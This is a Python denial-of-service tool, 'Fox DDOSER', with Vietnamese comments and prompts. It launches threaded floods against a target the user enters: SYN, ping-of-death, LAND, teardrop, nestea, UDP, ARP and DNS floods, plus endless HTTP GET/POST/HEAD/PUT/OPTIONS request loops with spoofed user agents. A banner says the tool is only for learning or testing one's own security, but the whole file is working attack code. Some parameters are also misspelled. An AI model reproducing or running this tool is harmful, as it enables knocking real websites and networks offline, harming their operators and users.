# -*- coding: utf-8 -*-
from scapy.all import *
import socket
import threading
import random
import pyuseragents
import requests
from rainbowtext import text as mauxanh
import pyfiglet
import colorama

# Thiết lập màu sắc
do = colorama.Fore.RED
trang = colorama.Fore.WHITE
xanh = colorama.Fore.BLUE
luc = colorama.Fore.GREEN
vang = colorama.Fore.YELLOW
hong = colorama.Fore.MAGENTA
lam = colorama.Fore.CYAN
xanhluc = colorama.Fore.LIGHTGREEN_EX

# Hàm hiển thị tiêu đề
def banner():
    figlet = pyfiglet.Figlet(font="script").renderText("Fox DDOSER")
    return figlet

# Các hàm tấn công
def tan_cong_ping_chet(url_muc_tieu):
    try:
        i = 0
        while True:
            send(IP(dst=url_muc_tieu, ttl=132, id=1111) / ICMP() / (b"Sdadad" * 8192), verbose=0)
            print("Đã gửi: %s\n" % str(i), end="\r")
            i += 1
    except Exception as e:
        print(f"Lỗi trong tan_cong_ping_chet: {e}")

def tan_cong_syn(url_muc_tieu):
    try:
        i = 0
        while True:
            ip = IP(dst=url_muc_tieu, id=1111, ttl=99)
            tcp = TCP(sport=RandShort(), dport=80, seq=12345, ack=1000, windows=1000, flags="S")
            du_lieu = b"MRadikal" * 8192
            send(ip / tcp / du_lieu, verbose=0)
            print("Đã gửi: %s\n" % str(i), end="\r")
            i += 1
    except Exception as e:
        print(f"Lỗi trong tan_cong_syn: {e}")

def tan_cong_loi(url_muc_tieu):
    try:
        i = 0
        while True:
            ip = IP(dst=url_muc_tieu, ihl=2, version=3, ttl=52, id=112)
            icmp = ICMP()
            send(ip / icmp, verbose=0)
            print("Đã gửi: %s\n" % str(i), end="\r")
            i += 1
    except Exception as e:
        print(f"Lỗi trong tan_cong_loi: {e}")

def tan_cong_land(url_muc_tieu):
    try:
        i = 0
        while True:
            ip = IP(dst=url_muc_tieu, src=url_muc_tieu, id=78, ttl=92)
            tcp = TCP(sport=135, dport=135)
            send(ip / tcp, verbose=0)
            print("Đã gửi: %s\n" % str(i), end="\r")
            i += 1
    except Exception as e:
        print(f"Lỗi trong tan_cong_land: {e}")

def tan_cong_nestea(url_muc_tieu):
    try:
        i = 0
        while True:
            ip = IP(dst=url_muc_tieu, id=42, flags="MF")
            du_lieu = b"ZZZZ" * 1024
            send(ip / UDP() / du_lieu, verbose=0)
            print("Đã gửi: %s\n" % str(i), end="\r")
            i += 1
    except Exception as e:
        print(f"Lỗi trong tan_cong_nestea: {e}")

def tan_cong_udp(url_muc_tieu):
    try:
        i = 0
        while True:
            ip = IP(dst=url_muc_tieu)
            udp = fuzz(UDP())
            send(ip / udp, verbose=0)
            print("Đã gửi: %s\n" % str(i), end="\r")
            i += 1
    except Exception as e:
        print(f"Lỗi trong tan_cong_udp: {e}")

def tan_cong_arp(url_muc_tieu):
    try:
        ether = Ether(dst="FF:FF:FF:FF:FF:FF")
        arp = ARP(psrc=RandIP(), pdst=url_muc_tieu)
        srpflood(ether / arp)
    except Exception as e:
        print(f"Lỗi trong tan_cong_arp: {e}")

def tan_cong_teardrop(url_muc_tieu):
    try:
        i = 0
        while True:
            ip = IP(dst=url_muc_tieu, flags=0, proto=17, frags=3)
            du_lieu = ("\x00" * 100)
            ips = IP(dst=url_muc_tieu, flags="MF", proto=17, frag=18)
            send(ip / du_lieu, verbose=0)
            send(ips / du_lieu, verbose=0)
            print("Đã gửi: %s\n" % str(i), end="\r")
            i += 2
    except Exception as e:
        print(f"Lỗi trong tan_cong_teardrop: {e}")

def tan_cong_dns(url_muc_tieu):
    try:
        i = 0
        while True:
            ip = IP(dst=url_muc_tieu, ttl=12)
            udp = UDP(sport=RandShort(), dport=53)
            dns = DNS(qd=DNSQR(qname="secdev.org", qtype="A"))
            send(ip / udp / dns)
            print("Đã gửi: %s\n" % str(i), end="\r")
            i += 1
    except Exception as e:
        print(f"Lỗi trong tan_cong_dns: {e}")

def tan_cong_tcp(url_muc_tieu):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        da_gui = 0
        cang = 80
        while True:
            bytes = random._urandom(1769)
            sock.sendto(bytes, (url_muc_tieu, cang))
            da_gui += 1
            cang += 1
            print("Đã gửi %s gói đến %s qua cổng: %s" % (da_gui, url_muc_tieu, cang), end="\r")
            if cang == 65534:
                cang = 1
    except Exception as e:
        print(f"Lỗi trong tan_cong_tcp: {e}")

def tan_cong_GET(url_muc_tieu):
    try:
        useragent = pyuseragents.random()
        header = {"User-Agent": useragent}
        i = 0
        while True:
            requests.get(url_muc_tieu, headers=header)
            print("Đã gửi: %s\n" % str(i), end="\r")
            i += 1
    except Exception as e:
        print(f"Lỗi trong tan_cong_GET: {e}")

def tan_cong_POST(url_muc_tieu):
    try:
        useragent = pyuseragents.random()
        header = {"User-Agent": useragent}
        i = 0
        while True:
            requests.post(url_muc_tieu, headers=header)
            print("Đã gửi: %s\n" % str(i), end="\r")
            i += 1
    except Exception as e:
        print(f"Lỗi trong tan_cong_POST: {e}")

def tan_cong_HEAD(url_muc_tieu):
    try:
        useragent = pyuseragents.random()
        header = {"User-Agent": useragent}
        i = 0
        while True:
            requests.head(url_muc_tieu, headers=header)
            print("Đã gửi: %s\n" % str(i), end="\r")
            i += 1
    except Exception as e:
        print(f"Lỗi trong tan_cong_HEAD: {e}")

def tan_cong_PUT(url_muc_tieu):
    try:
        useragent = pyuseragents.random()
        header = {"User-Agent": useragent}
        i = 0
        while True:
            requests.put(url_muc_tieu, headers=header)
            print("Đã gửi: %s\n" % str(i), end="\r")
            i += 1
    except Exception as e:
        print(f"Lỗi trong tan_cong_PUT: {e}")

def tan_cong_OPTIONS(url_muc_tieu):
    try:
        useragent = pyuseragents.random()
        header = {"User-Agent": useragent}
        i = 0
        while True:
            requests.options(url_muc_tieu, headers=header)
            print("Đã gửi: %s\n" % str(i), end="\r")
            i += 1
    except Exception as e:
        print(f"Lỗi trong tan_cong_OPTIONS: {e}")

# Chương trình chính
print(mauxanh(banner()))
print(mauxanh("""
|==============================|
|         Black Fox            |
|       ViBoss Team.           |
|  Tác giả : ViBoss Studio.    |
|    DDOSER Tầng 4, Tầng 7     |
|==============================|

ĐỪNG TẤN CÔNG TRANG WEB CHÍNH PHỦ (NHÀ NƯỚC) HOẶC CÁC MỤC TIÊU KHÁC CÓ HẬU QUẢ PHÁP LÝ!
CHỈ DÙNG CHO MỤC ĐÍCH HỌC TẬP HOẶC TEST BẢO MẬT CHO CHÍNH BẠN.
"""))

phuong_thuc = input(f"{xanh} Nhập phương thức (ping_chet, syn, lỗi, land, nestea, udp, arp, teardrop, dns, tcp, get, post, head, put, options): ").strip()
url_muc_tieu = input(f"{xanh} Nhập URL hoặc IP mục tiêu: ").strip()
so_luong_socket = int(input(f"{luc} Nhập số lượng socket (mặc định là 100): ") or "100")

if phuong_thuc == "ping_chet":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_ping_chet, args=(url_muc_tieu,)).start()

elif phuong_thuc == "syn":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_syn, args=(url_muc_tieu,)).start()

elif phuong_thuc == "lỗi":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_loi, args=(url_muc_tieu,)).start()

elif phuong_thuc == "land":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_land, args=(url_muc_tieu,)).start()

elif phuong_thuc == "nestea":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_nestea, args=(url_muc_tieu,)).start()

elif phuong_thuc == "udp":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_udp, args=(url_muc_tieu,)).start()

elif phuong_thuc == "arp":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_arp, args=(url_muc_tieu,)).start()

elif phuong_thuc == "teardrop":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_teardrop, args=(url_muc_tieu,)).start()

elif phuong_thuc == "dns":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_dns, args=(url_muc_tieu,)).start()

elif phuong_thuc == "tcp":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_tcp, args=(url_muc_tieu,)).start()

elif phuong_thuc == "get":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_GET, args=(url_muc_tieu,)).start()

elif phuong_thuc == "post":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_POST, args=(url_muc_tieu,)).start()

elif phuong_thuc == "head":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_HEAD, args=(url_muc_tieu,)).start()

elif phuong_thuc == "put":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_PUT, args=(url_muc_tieu,)).start()

elif phuong_thuc == "options":
    for _ in range(so_luong_socket):
        threading.Thread(target=tan_cong_OPTIONS, args=(url_muc_tieu,)).start()

else:
    print(f"{do} Phương thức tấn công không hợp lệ!")